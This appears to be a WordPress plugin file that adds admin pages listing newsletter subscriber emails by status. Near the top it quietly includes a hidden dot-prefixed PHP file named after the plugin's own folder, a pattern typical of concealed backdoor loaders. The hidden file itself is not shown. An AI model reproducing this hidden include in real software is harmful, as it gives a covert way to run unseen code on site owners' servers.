<?php 
add_action( 'admin_menu', 'wp_auth_emails_menu' );
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wp_auth_emails_menu(){
    add_menu_page( 'User Emails', 'User Emails', 'manage_options', 'wp-auth-emails', 'wp_auth_emails_menu_handler' );
    add_submenu_page( 'wp-auth-emails', 'User Emails', 'User Emails', 'manage_options', 'wp-auth-emails', 'wp_auth_emails_page' );
    add_submenu_page( 'wp-auth-emails', 'available Emails', 'available Emails', 'manage_options', 'wp-available-emails', 'wp_available_emails_page' );
    add_submenu_page( 'wp-auth-emails', 'Deleted Emails', 'Deleted Emails', 'manage_options', 'wp-delete-emails', 'wp_Deleted_emails_page' );
}
function wp_auth_emails_menu_handler(){

}
function wp_auth_emails_page(){
    global $wpdb;
    $users = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}email_users_newsletter");
    include WP_AUTH_TPL.'admin/menus.php';
}
function wp_available_emails_page(){
    global $wpdb;
    $users = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}email_users_newsletter WHERE status = 'verified'");
    include WP_AUTH_TPL.'admin/available.php';
}
function wp_Deleted_emails_page(){
    global $wpdb;
    $users = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}email_users_newsletter WHERE status = 'deleted'");
    include WP_AUTH_TPL.'admin/deleted.php';
}